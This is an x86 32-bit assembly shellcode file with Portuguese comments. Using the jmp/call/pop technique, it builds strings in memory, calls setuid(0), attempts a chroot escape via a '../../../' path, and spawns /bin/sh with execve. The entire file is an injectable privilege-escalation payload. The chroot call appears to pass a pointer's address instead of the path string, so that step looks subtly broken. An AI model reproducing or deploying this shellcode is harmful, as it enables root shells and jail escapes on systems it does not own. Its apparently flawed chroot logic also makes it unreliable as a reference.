BITS 32

jmp short       __end

__start:

 pop            esi             ; endereco da string em esi
 xor            eax, eax        ; eax = 0
 mov byte       [esi + 7], al   ; esi + 7 = 0
 lea            ebx, [esi]      ; ebx = endereco de /bin/sh
 mov long       [esi + 8], ebx  ; esi + 8 = endereco de /bin/sh
 mov long       [esi + 12], eax ; esi + 12 = 0
 lea            ebx, [esi + 20] ; ebx = endereco de ../../../../
 mov long       [esi + 16], ebx ; esi + 16 = endereco de ../../../

; setuid(0);
 mov byte        al, 0x17        ; 0x17 equivale a 23 em decimal
                                 ; que e' o numero da syscall setuid
 xor             ebx, ebx        ; ebx = 0
 int             0x80            ; setuid(0);


; chroot("../../../../../../../");
 mov byte      al, 0x3d
 lea           ebx, [esi + 16]
 int           0x80

; execve(sh[0], sh, NULL);
 add            al, 0x0b
 mov            ebx, esi
 lea            ecx, [esi + 8]
 lea            edx, [esi + 12]
 int            0x80

; exit (0);
 xor             eax, eax       ; eax = 0
 inc             eax            ; eax = 1
 xor             ebx, ebx       ; ebx = 0
 int             0x80           ; exit (0);

__end:
call            __start
db              '/bin/sh$XXXXNULLCCCC'
db              '../../../../../../../'